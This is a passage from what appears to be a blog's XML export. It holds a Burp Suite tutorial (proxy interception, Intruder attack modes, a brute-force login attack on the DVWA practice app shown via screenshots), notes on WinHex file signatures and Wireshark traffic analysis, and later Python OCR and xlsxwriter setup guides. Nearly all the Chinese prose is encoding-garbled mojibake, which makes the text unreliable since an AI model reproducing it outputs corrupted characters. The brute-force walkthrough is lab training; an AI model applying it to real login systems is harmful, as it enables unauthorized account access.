<p>Burp ä»£ç†å…è®¸ä½ é€šè¿‡ç›‘è§†å’Œæ“çºµåº”ç”¨ç¨‹åºä¼ è¾“çš„å…³é”®å‚æ•°å’Œå…¶ä»–æ•°æ®æ¥æŸ¥æ‰¾å’Œæ¢ç´¢åº”ç”¨ç¨‹åºçš„æ¼æ´ã€‚é€šè¿‡ä»¥æ¶æ„çš„æ–¹å¼ä¿®æ”¹æµè§ˆå™¨çš„è¯·æ±‚ï¼ŒBurp ä»£ç†å¯ä»¥ç”¨æ¥è¿›è¡Œæ”»å‡»ï¼Œå¦‚ï¼šSQL æ³¨å…¥ï¼Œcookie æ¬ºéª—ï¼Œæå‡æƒé™ï¼Œä¼šè¯åŠ«æŒï¼Œç›®å½•éå†ï¼Œç¼“å†²åŒºæº¢å‡ºã€‚æ‹¦æˆªçš„ä¼ è¾“å¯ä»¥è¢«ä¿®æ”¹æˆåŸå§‹æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒ…å«å‚æ•°æˆ–è€…æ¶ˆæ¯å¤´çš„è¡¨æ ¼ï¼Œä¹Ÿå¯ä»¥åå…­è¿›åˆ¶å½¢å¼ï¼Œç”šè‡³å¯ä»¥æ“çºµäºŒè¿›åˆ¶å½¢å¼çš„æ•°æ®ã€‚åœ¨ Burp ä»£ç†å¯ä»¥å‘ˆç°å‡ºåŒ…å« HTML æˆ–è€…å›¾åƒæ•°æ®çš„å“åº”æ¶ˆæ¯ã€‚</p>
<h3 id="intercept">intercept</h3>
<ul>
<li>
<p>interceptï¼šç”¨äºæ˜¾ç¤ºå’Œä¿®æ”¹Httpè¯·æ±‚å’Œç›¸åº”ï¼Œé€šè¿‡ä½ çš„æµè§ˆå™¨å’ŒwebæœåŠ¡å™¨ä¹‹é—´æ‹¦æˆªæµé‡å®ç°åŠŸèƒ½ï¼Œåœ¨Proxyçš„é€‰é¡¹ä¸­ï¼Œå¯ä»¥é…ç½®æ‹¦æˆªè§„åˆ™æ¥ç¡®å®šæ˜¯ä»€ä¹ˆè¯·æ±‚å’Œç›¸åº”è¢«æ‹¦æˆªï¼ˆä¾‹å¦‚ï¼ŒèŒƒå›´å†…çš„é¡¹ç›®ï¼Œç‰¹å®šæ–‡ä»¶æ‰©å±•åã€é¡¹ç›®è¦æ±‚ä¸å‚æ•°ï¼‰</p>
</li>
<li>
<p>forwordï¼šå°†è¯·æ±‚åŒ…å‘å‡º</p>
</li>
<li>
<p>dropï¼šä¸¢æ‰è¯·æ±‚åŒ…</p>
</li>
<li>
<p>intercept is on/offï¼šæˆªæ–­çš„å¼€å…³</p>
</li>
<li>
<p>Actionï¼šå¯¹è¯·æ±‚åŒ…çš„ä¸€äº›æ“ä½œï¼Œæˆ‘ä»¬å¯¹åŒ…ä½“çš„ä»»ä½•ä¿®æ”¹éƒ½å¯ä»¥åœ¨è¿™ä¸ªçª—å£å†…è¿›è¡Œç›´æ¥ä¿®æ”¹ï¼Œç„¶åå‘é€</p>
</li>
<li>
<p>Rawï¼šå¸¸è§„æ•°æ®åŒ…æ¨¡å¼</p>
</li>
<li>
<p>headerï¼šè¯·æ±‚å¤´</p>
</li>
<li>
<p>Hexï¼šåå…­è¿›åˆ¶æ•°æ®</p>
</li>
</ul>
<h3 id="http-history">http history</h3>
<p>æ¨¡å—é‡Œé¢æ˜¯æˆ‘ä»¬æ‰“å¼€burpsuiteä»£ç†ä»¥æ¥æ‰€æœ‰çš„httpè¯·æ±‚ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™éªŒè¯æ¼æ´æˆåŠŸäº†ä½†æ˜¯å¤ç°ä¸æˆåŠŸè¿™ç§åœºæ™¯éƒ½å¯ä»¥åœ¨è¿™é‡Œé¢è¿›è¡Œè¯·æ±‚çš„å›çœ‹ã€‚</p>
<h3 id="option">option</h3>
<p>åœ¨optionsé€‰é¡¹æˆ‘ä»¬å¯ä»¥è®¾ç½®è¯·æ±‚çš„ç›‘å¬å’Œæ‹¦æˆªæˆªæ–­å®¢æˆ·æ®µçš„è¯·æ±‚å’ŒæœåŠ¡ç«¯çš„è¿”å›ä»¥åŠwebsocket è¯·æ±‚çš„æˆªæ–­ã€‚åœ¨æ­¤å¤„æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬ç›‘å¬çš„ipå’Œç«¯å£ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬burpsuiteçš„è¯·æ±‚åŒ…æˆªå–ä¸åˆ°å¯èƒ½å°±æ˜¯å› ä¸ºæ­¤å¤„æœ‰é—®é¢˜ï¼Œç«¯å£å†²çªç­‰ç­‰</p>
<h2 id="Intrude">Intrude</h2>
<ul>
<li>
<p>attack typeï¼šæ”»å‡»æ¨¡å¼è®¾ç½®</p>
</li>
<li>
<p>sniperï¼šå¯¹å˜é‡ä¾æ¬¡è¿›è¡Œç ´è§£ã€‚å¤šä¸ªæ ‡è®°ä¾æ¬¡è¿›è¡Œã€‚</p>
</li>
<li>
<p>battering ramï¼šå¯¹å˜é‡åŒæ—¶è¿›è¡Œç ´è§£ã€‚å¤šä¸ªæ ‡è®°åŒæ—¶è¿›è¡Œã€‚</p>
</li>
<li>
<p>pitchforkï¼šæ¯ä¸€ä¸ªå˜é‡æ ‡è®°å¯¹åº”ä¸€ä¸ªå­—å…¸ï¼Œå–æ¯ä¸ªå­—å…¸çš„å¯¹åº”é¡¹ã€‚</p>
</li>
<li>
<p>cluster bombï¼šå¯¹æ¯ä¸ªå˜é‡å¯¹åº”ä¸€ä¸ªå­—å…¸ï¼Œå¹¶ä¸”è¿›è¡Œäº¤é›†ï¼Œå¹¶ä¸”è¿›è¡Œäº¤å‰çˆ†ç ´ï¼Œå°è¯•å„ç§ç»„åˆã€‚</p>
</li>
</ul>
<p><strong>Payloadï¼š</strong></p>
<ul>
<li>
<p>Payload Sets Payloadæ•°é‡ç±»å‹è®¾ç½®</p>
</li>
<li>
<p>Payload Opetions[Simple list]  è¯¥é€‰é¡¹ä¼šæ ¹æ®é€‰é¡¹1ä¸­Payload typeçš„è®¾ç½®è€Œæ”¹å˜</p>
</li>
<li>
<p>Payload Processing å¯¹ç”Ÿæˆçš„Payloadè¿›è¡Œç¼–ç ã€åŠ å¯†ã€æˆªå–ç­‰æ“ä½œ</p>
</li>
<li>
<p>Payload Encoding ä½ å¯ä»¥é…ç½®å“ªäº›æœ‰æ•ˆè½½è·ä¸­çš„å­—ç¬¦åº”è¯¥æ˜¯URLç¼–ç çš„HTTPè¯·æ±‚ä¸­çš„å®‰å…¨ä¼ è¾“ã€‚ä»»ä½•å·²é…ç½®çš„URLç¼–ç æœ€ååº”ç”¨ï¼Œä»»ä½•æœ‰æ•ˆè½½è·å¤„ç†è§„åˆ™æ‰§è¡Œä¹‹åã€‚</p>
</li>
</ul>
<h2 id="Repeater">Repeater</h2>
<p>é‡æ”¾æ•°æ®åŒ…ã€‚</p>
<p>ä¸€èˆ¬ä¿®æ”¹å‚æ•°ï¼Œç„¶åé‡æ”¾æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹è¿”å›ç»“æœã€‚</p>
<h2 id="æŠ“åŒ…ç¤ºä¾‹">æŠ“åŒ…ç¤ºä¾‹</h2>
<blockquote>
<p>DVWA-brute force-low</p>
</blockquote>
<ul>
<li><code>Intercept On</code></li>
<li>foxy proxyé€‰æ‹©å¯¹åº”æ¨¡å¼</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202233318301.png" class="" title="image-20241202233318301">
<p>å³å‡»ï¼Œè½¬åˆ° intrude æ¿å—ï¼Œè®¾ç½®è´¦å·ã€å¯†ç ä¸ºæŒ‡å®šå¯¹è±¡ï¼šï¼ˆè¿™é‡ŒCluster bomb æ˜¯ æ‰«æ1å­—å…¸*2å­—å…¸ æ¬¡æ•°ï¼Œä¹Ÿå°±æ˜¯username å’Œ password çš„æ‰«æå®Œå…¨ç‹¬ç«‹ã€‚ï¼‰</p>
<p>åˆ†åˆ«è®¾ç½®å­—å…¸ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202233723759.png" class="" title="image-20241202233723759">
<p>è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202233916212.png" class="" title="image-20241202233916212">
<p>ç™»å½•æˆåŠŸçš„æ˜¾ç¤ºã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202234020235.png" class="" title="image-20241202234020235">
<p>ä¹Ÿèƒ½ç›´æ¥æŠ“åŒ…é‡æ”¾ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202234221305.png" class="" title="image-20241202234221305">
<h1>WinhexæŸ¥çœ‹æ–‡ä»¶</h1>
<table>
<thead>
<tr>
<th>å¸¸è§æ–‡ä»¶</th>
<th>16è¿›åˆ¶æ ¼å¼</th>
<th>ASCIIå­—ç¬¦</th>
</tr>
</thead>
<tbody>
<tr>
<td>JPG</td>
<td>æ–‡ä»¶å¤´ï¼šFFD8ï¼›æ–‡ä»¶å°¾ï¼šFFD9</td>
<td>jpg</td>
</tr>
<tr>
<td>PNG</td>
<td>æ–‡ä»¶å¤´ï¼š89504E47ï¼›æ–‡ä»¶å°¾ï¼šAE426082</td>
<td>png</td>
</tr>
<tr>
<td>ZIP/DOCX/XLS</td>
<td>æ–‡ä»¶å¤´ï¼š504B0304</td>
<td>pk</td>
</tr>
<tr>
<td>â€¦â€¦</td>
<td>â€¦â€¦</td>
<td>â€¦â€¦</td>
</tr>
</tbody>
</table>
<ul>
<li>ä¸¤ä¸ªä¸»ç•Œé¢
<ul>
<li>å·¦ï¼šæ–‡ä»¶16è¿›åˆ¶æ ¼å¼</li>
<li>å³ï¼š16è¿›åˆ¶è½¬æ¢æˆASCIIå­—ç¬¦</li>
</ul>
</li>
<li>æœç´¢å»å®šä½æ•°æ®
<ul>
<li>16è¿›åˆ¶æ•°å€¼ï¼šå¾€å¾€æå–å¯èƒ½å­˜åœ¨çš„è¿½åŠ æ–‡ä»¶</li>
<li>å­—ç¬¦ä¸²ï¼šå­˜åœ¨<code>flag&#123;</code>æˆ–è€…ä¸€äº›å…³é”®å­—è½¬ç ï¼ˆç¼–ç ï¼‰</li>
</ul>
</li>
</ul>
<h1>æµé‡åˆ†ææµç¨‹</h1>
<h2 id="ä¸‰ä¸ªç•Œé¢">ä¸‰ä¸ªç•Œé¢</h2>
<ul>
<li>
<p>åˆ†ç»„åˆ—è¡¨ï¼šç€è‰²åŒºåŸŸï¼Œæä¾›å…³é”®æ•°æ®æ˜¾ç¤ºï¼Œipè·ŸInfoâ€¦â€¦</p>
</li>
<li>
<p>åˆ†ç»„è¯¦æƒ…ï¼šåŸºäºåè®®è¿›è¡ŒæŠ¥æ–‡æ‹†åˆ†ï¼ŒæŒ‰ç…§ä»åº•å±‚åˆ°é¡¶å±‚ï¼ˆç›¸å¯¹æ¥è¯´ï¼Œæ›´å…³æ³¨é è¿‘é¡¶å±‚çš„åè®®ï¼ŒTCP/UDPåŠä»¥ä¸Šçš„åè®®ï¼‰</p>
</li>
<li>
<p>åˆ†ç»„å­—èŠ‚æµï¼šæ•°æ®åŒ…çš„åŸå§‹æ•°æ®ï¼ˆæ•°æ®é‡æœ€å…¨ï¼‰ï¼Œä½œä¸º<strong>æŸ¥æ‰¾åŒºåŸŸ</strong></p>
</li>
</ul>
<h2 id="æ€»ä½“åˆ†æ"><strong>æ€»ä½“åˆ†æ</strong></h2>
<ul>
<li>åè®®åˆ†çº§ï¼šç­›é€‰å‡ºå…³é”®åè®®
<ul>
<li>å‘ç°æµé‡åŒ…ä¸­éƒ½æ˜¯<strong>å¸¸è§åè®®</strong>ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ç›¸å¯¹é ä¸Šå±‚<strong>å æ¯”ç›¸å¯¹æ›´å¤š</strong>çš„åè®®ã€‚</li>
<li>å‘ç°æµé‡åŒ…ä¸­å­˜åœ¨<strong>ä¸å¸¸è§åè®®</strong>ï¼Œå»å…³æ³¨<strong>å æ¯”ç›¸å¯¹æ›´å°‘</strong>çš„åè®®ã€‚</li>
</ul>
</li>
<li>ä¼šè¯ï¼šç­›é€‰å‡ºå…³é”®ä¼šè¯ã€‚
<ul>
<li>é€šè¿‡<strong>åˆ†ç»„æ’åº</strong>ï¼ŒæŠŠå…³é”®ä¼šè¯ç­›é€‰å‡ºæ¥ã€‚</li>
<li>ç›¸å¯¹æ¥è¯´çœ‹åˆ†ç»„æ•°é‡æ›´å¤š/æ›´å°‘çš„ä¼šè¯</li>
</ul>
</li>
<li>ç«¯ç‚¹ï¼ˆ<strong>ç½‘ç»œæ”»å‡»è¡Œä¸º</strong>ä¸­ç›¸å¯¹è¾ƒå¤šï¼‰ï¼šç­›é€‰å‡ºæŸä¸ªå…³é”®IPï¼Œ<strong>è§’è‰²</strong>åŒºåˆ†ï¼šæœåŠ¡å™¨è§’è‰²ã€æ™®é€šç”¨æˆ·ã€æ”»å‡»è€…
<ul>
<li>æ•°æ®é‡æœ€å¤šï¼šæœåŠ¡å™¨</li>
<li>æ•°æ®é‡ç›¸å¯¹è¾ƒå¤šï¼šæ”»å‡»è€…</li>
<li>æ•°æ®é‡è¾ƒå°‘ï¼šæ­£å¸¸ç”¨æˆ·</li>
</ul>
</li>
</ul>
<h2 id="è¯¦ç»†åˆ†æ"><strong>è¯¦ç»†åˆ†æ</strong></h2>
<ul>
<li>
<p>åŸºäº<strong>å·²çŸ¥æµé‡</strong>è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨æ€»ä½“åˆ†æçš„åŸºç¡€ä¹‹ä¸Šè¿›è¡ŒæŸ¥çœ‹</p>
</li>
<li>
<p>åŸºäº<strong>åˆ†æä¿¡æ¯</strong>è¿›è¡Œè¿‡æ»¤ï¼Œæ ¹æ®<strong>è¿‡æ»¤è¯­å¥</strong>è¿›è¡Œè¿‡æ»¤</p>
<ul>
<li>
<p>åŸºäºåè®®ï¼šftp/http</p>
</li>
<li>
<p>åŸºäºipï¼šip.addr/src/dst == xxx</p>
</li>
<li>
<p>é€šè¿‡æŠ¥æ–‡ç±»å‹è¿›è¡Œç­›é€‰ï¼š<code>http.request.method == GET/POST</code>/<code>http.response.code == 200/404/302</code></p>
<ul>
<li>ç™»å½•åœºæ™¯ï¼š302</li>
</ul>
</li>
</ul>
</li>
<li>
<p>è¿½è¸ªæµ</p>
<ul>
<li>ç‰ˆæœ¬è¾ƒè€çš„wiresharkï¼Œç›´æ¥æ¨èTCPè¿½è¸ªæµ</li>
<li>ç‰ˆæœ¬æ–°çš„wiresharkï¼Œä¼˜å…ˆTCPï¼Œä½†HTTPä¸€èˆ¬ä¹Ÿèƒ½è¾¾æˆç›®çš„</li>
<li>HTTPåœ¨TCPåŸºç¡€ä¹‹ä¸Šï¼Œå»é™¤äº†éƒ¨åˆ†ä¿¡æ¯ã€‚å¯¹éœ€è¦æå–çš„æ•°æ®ä¸å¤ªæ˜ç¡®çš„æƒ…å†µä¸‹ï¼Œæ¨èHTTPè¿½è¸ªæµï¼›ç›¸å¯¹æ˜ç¡®æ–‡ä»¶æ•°æ®ï¼Œæ¨èæ›´å…¨çš„TCPè¿½è¸ªæµã€‚</li>
</ul>
</li>
</ul>
<h2 id="æ•°æ®æå–"><strong>æ•°æ®æå–</strong></h2>
<ul>
<li>
<p>å­—ç¬¦ä¸²æå–</p>
</li>
<li>
<p>æ–‡ä»¶æå–</p>
</li>
<li>
<p>è¿½è¸ªæµåˆ†æå‡ºæ¥çš„ä¿¡æ¯è¿›è¡Œæå–</p>
</li>
<li>
<p>å¯¼å‡ºå¯¹è±¡ï¼šHTTP/FTP</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>Environment</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-OCR-Study</title>
    <url>/2024/08/08/Python-OCR-Study/</url>
    <content><![CDATA[<p>Python OCRç›¸å…³ç¯å¢ƒçš„å®‰è£…ä»¥åŠæ­å»ºã€‚<br>ä¸»è¦ç”¨åˆ°çš„æ˜¯pytesseractã€‚</p>
<span id="more"></span><!--toc-->

<h1 id="pytesseract"><a href="#pytesseract" class="headerlink" title="pytesseract"></a>pytesseract</h1><blockquote>
<p>ç†è®ºä¸Špython3.8åŠä»¥ä¸Šå°±å¯ä»¥äº†ã€‚</p>
</blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> å®‰è£…</li>
<li><input checked="" disabled="" type="checkbox"> è„šæœ¬ç›¸å…³è¿è¡Œ</li>
</ul>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><blockquote>
<p><a href="https://digi.bib.uni-mannheim.de/tesseract/">Index of &#x2F;tesseract (uni-mannheim.de)</a><br>é€‰æ‹©æœ€æ–°çš„è¿›è¡Œä¸‹è½½ï¼Œç›¸å¯¹å„ä¸ªåº“éƒ½ä¼šä¸‹è½½åˆ°æœ€æ–°çš„ç‰ˆæœ¬ã€‚</p>
</blockquote>
<p><strong>!</strong> å®‰è£…è¿‡ç¨‹ä¸­éœ€è¦æŠŠ<strong>ä¸­æ–‡çš„è®­ç»ƒæ¨¡å‹</strong>è¿›è¡Œä¸‹è½½ï¼Œæœ€å¥½å°±æ˜¯æŠŠä¸­æ–‡ç®€ä½“ç›¸å…³ç­‰ä¸‹è½½ä¸‹æ¥ã€‚<br><strong>! éœ€è¦é…ç½®ç¯å¢ƒå˜é‡</strong></p>
<ul>
<li>Pathä¸­æ·»åŠ <code>..\Tesseract-OCR</code><ul>
<li>ç”¨æˆ·å˜é‡</li>
<li>ç³»ç»Ÿå˜é‡</li>
</ul>
</li>
<li>æ–°å»ºå˜é‡å<code>TESSDATA_PREFIX</code><ul>
<li>ç³»ç»Ÿå˜é‡</li>
</ul>
</li>
</ul>
<p>æ‰“å¼€å‘½ä»¤è¡Œç•Œé¢ï¼Œè¿è¡Œ<code>tesseract -v</code>ï¼Œå¦‚æœèƒ½æ­£å¸¸æ˜¾ç¤ºå®‰è£…çš„tesseractçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå³è¯´æ˜å®‰è£…æˆåŠŸã€‚</p>
<p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œæœ‰æ—¶å€™æŠŠç¯å¢ƒæ­å»ºå¥½äº†ç¨å¾®å¤„ç†ä¸€ä¸‹å°±åˆæ— æ³•è¿è¡Œäº†ï¼Œç›®å‰æ²¡ä»€ä¹ˆåˆé€‚çš„è§£å†³æ–¹å¼ï¼Œç›´æ¥å¸è½½é‡æ–°è£…<code>tesseract</code>ï¼Œç„¶åå†æŠŠå¯¹åº”çš„è®­ç»ƒæ¨¡å‹è¿›è¡Œä¸‹è½½ã€‚</p>
<h2 id="è‹±æ–‡"><a href="#è‹±æ–‡" class="headerlink" title="è‹±æ–‡"></a>è‹±æ–‡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> pytesseract  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># é…ç½®pytesseract  </span></span><br><span class="line">pytesseract.pytesseract.tesseract_cmd = <span class="string">&#x27;D:\\Tesseract-OCR\\tesseract.exe&#x27;</span>  <span class="comment"># ä¿®æ”¹ä¸ºä½ çš„tesseractå®‰è£…è·¯å¾„  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># è¯»å–å›¾ç‰‡æ–‡ä»¶å¤¹  </span></span><br><span class="line">image_folder = <span class="string">&#x27;test&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># è·å–æ–‡ä»¶åˆ—è¡¨  </span></span><br><span class="line">image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(image_folder) <span class="keyword">if</span> os.path.isfile(os.path.join(image_folder, f))]  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># å¤„ç†å›¾ç‰‡å¹¶ä¿å­˜ç»“æœ  </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ocr_results_en.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> image_files:  </span><br><span class="line">        file_path = os.path.join(image_folder, file_name)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># è¯»å–å›¾ç‰‡  </span></span><br><span class="line">        image = cv2.imread(file_path)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># ä½¿ç”¨Tesseractè¿›è¡ŒOCRè¯†åˆ«  </span></span><br><span class="line">        text = pytesseract.image_to_string(image, lang=<span class="string">&#x27;eng&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># å†™å…¥ç»“æœåˆ°æ–‡ä»¶  </span></span><br><span class="line">        f.write(<span class="string">f&quot;File: <span class="subst">&#123;file_name&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">f&quot;Text: <span class="subst">&#123;text&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<h2 id="ä¸­æ–‡"><a href="#ä¸­æ–‡" class="headerlink" title="ä¸­æ–‡"></a>ä¸­æ–‡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> pytesseract  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># é…ç½®pytesseract  </span></span><br><span class="line">pytesseract.pytesseract.tesseract_cmd = <span class="string">&#x27;D:\\Tesseract-OCR\\tesseract.exe&#x27;</span>  <span class="comment"># ä¿®æ”¹ä¸ºä½ çš„tesseractå®‰è£…è·¯å¾„  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># è¯»å–å›¾ç‰‡æ–‡ä»¶å¤¹  </span></span><br><span class="line">image_folder = <span class="string">&#x27;test&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># è·å–æ–‡ä»¶åˆ—è¡¨  </span></span><br><span class="line">image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(image_folder) <span class="keyword">if</span> os.path.isfile(os.path.join(image_folder, f))]  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># å¤„ç†å›¾ç‰‡å¹¶ä¿å­˜ç»“æœ  </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ocr_results_zh.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> image_files:  </span><br><span class="line">        file_path = os.path.join(image_folder, file_name)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># è¯»å–å›¾ç‰‡  </span></span><br><span class="line">        image = cv2.imread(file_path)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># ä½¿ç”¨Tesseractè¿›è¡ŒOCRè¯†åˆ«  </span></span><br><span class="line">        text = pytesseract.image_to_string(image, lang=<span class="string">&#x27;chi_sim&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># å†™å…¥ç»“æœåˆ°æ–‡ä»¶  </span></span><br><span class="line">        f.write(<span class="string">f&quot;File: <span class="subst">&#123;file_name&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">f&quot;Text: <span class="subst">&#123;text&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># é»˜è®¤ä¿å­˜ç¼–ç ä¸ºgbkçš„ï¼Œå¦‚æœéœ€è¦è½¬æ¢å¸¸ç”¨ç¼–ç utf8çš„ï¼Œç›´æ¥åœ¨å†™å…¥åˆ°æ–°æ–‡ä»¶ä¸­ä»¥utf-8çš„ç¼–ç ä¿å­˜å³å¯ã€‚</span></span><br></pre></td></tr></table></figure>

<h1 id="Paddle"><a href="#Paddle" class="headerlink" title="Paddle"></a>Paddle</h1><h2 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install paddleocr -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br><span class="line">pip install paddle -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>

<p><em>ç†è®ºä¸Šç›´æ¥æŒ‰ç…§è¿™ç§è¿›è¡Œpipå®‰è£…å³å¯ã€‚</em></p>
<p>ä½†æ˜¯å®‰è£…<code>paddle</code>ä¼šå‡ºç°<code> error: subprocess-exited-with-error</code>æŠ¥é”™ï¼Œæ„æ€è¯´æ˜¯<code>subprocess</code>æ¨¡å—å•¥çš„å®‰è£…å¤±è´¥ã€‚</p>
<p>emmm</p>
<blockquote>
<p>å‘ï¼šshapely çš„ç‰ˆæœ¬å¿…é¡»å¿…é¡»å¿…é¡»æ˜¯ 1.7.1 ï¼Œä¸èƒ½æ¯”è¿™é«˜ï¼ï¼ï¼requirements.txt ä¹Ÿæ²¡æœ‰è¿™ä¸ªæç¤ºã€‚å¦‚æœæ¯”è¿™ä¸ªç‰ˆæœ¬é«˜ï¼Œä¸ä¼šæ­£å¸¸è¿è¡Œï¼Œè€Œä¸”è¿˜ä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯è¿”å› â€˜é€€å‡ºä»£ç ä¸º -1073741819 (0xC0000005) çš„å­—æ ·â€™ã€‚ æ³ªå¥”äº†ï¼Œæ‰¾äº†2å¤©ç»ˆäºè§£å†³äº†â€¦</p>
</blockquote>
<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/Fan_shine/article/details/123089196">https://blog.csdn.net/Fan_shine/article/details/123089196</a></p>
<blockquote>
<p><a href="https://github.com/PaddlePaddle/PaddleOCR/issues/212">Win10 CPUç¯å¢ƒï¼ŒOSError: [WinError 126] æ‰¾ä¸åˆ°æŒ‡å®šçš„æ¨¡å— Â· Issue #212 Â· PaddlePaddle&#x2F;PaddleOCR Â· GitHub</a></p>
</blockquote>
<p>shapelyï¼Œä¸‹è½½åœ°å€ï¼š</p>
<blockquote>
<p><a href="https://pypi.tuna.tsinghua.edu.cn/simple/shapely/">Links for shapely (tsinghua.edu.cn)</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>OCR</tag>
        <tag>tesseract</tag>
        <tag>pytesseract</tag>
        <tag>paddle</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-Xlsx-Study</title>
    <url>/2024/08/14/Python-xlsx-Study/</url>
    <content><![CDATA[<p>Pythoné‡Œé¢æ¶‰åŠxlsxæ–‡ä»¶çš„ç›¸å…³æ“ä½œã€‚</p>
<p>è®°å½•ä¸€ä¸‹ã€‚</p>
<span id="more"></span><!--toc-->

<p>#Python&#x2F;xlsx</p>
<p>Reference: <a href="https://blog.csdn.net/ixusy88/article/details/106742403">Python3ä¹‹excelæ“ä½œâ€“xlsxwriteræ¨¡å—_python 3 xlswriter-CSDNåšå®¢</a></p>
<!--more--><!--toc-->

<h1 id="ç›¸å…³åº“å®‰è£…"><a href="#ç›¸å…³åº“å®‰è£…" class="headerlink" title="ç›¸å…³åº“å®‰è£…"></a>ç›¸å…³åº“å®‰è£…</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install xlsxwriter</span><br></pre></td></tr></table></figure>


<h1 id="å¸¸ç”¨æ“ä½œ"><a href="#å¸¸ç”¨æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ“ä½œ"></a>å¸¸ç”¨æ“ä½œ</h1><h2 id="åˆ›å»ºå·¥ä½œç°¿ã€å·¥ä½œè¡¨"><a href="#åˆ›å»ºå·¥ä½œç°¿ã€å·¥ä½œè¡¨" class="headerlink" title="åˆ›å»ºå·¥ä½œç°¿ã€å·¥ä½œè¡¨"></a>åˆ›å»ºå·¥ä½œç°¿ã€å·¥ä½œè¡¨</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># åˆ›å»ºå·¥ä½œç°¿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªexcelæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># åˆ›å»ºå·¥ä½œè¡¨</span></span><br><span class="line">worksheet = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#åœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºtest-sheet1çš„sheet,ä¸åŠ åå­—é»˜è®¤ä¸ºsheet1</span></span><br><span class="line">worksheet2 = workbook.add_worksheet()   <span class="comment">#  Sheet2</span></span><br><span class="line">worksheet3 = workbook.add_worksheet(<span class="string">&#x27;test-sheet2&#x27;</span>)</span><br><span class="line">worksheet4 = workbook.add_worksheet()  <span class="comment">#  Sheet4</span></span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

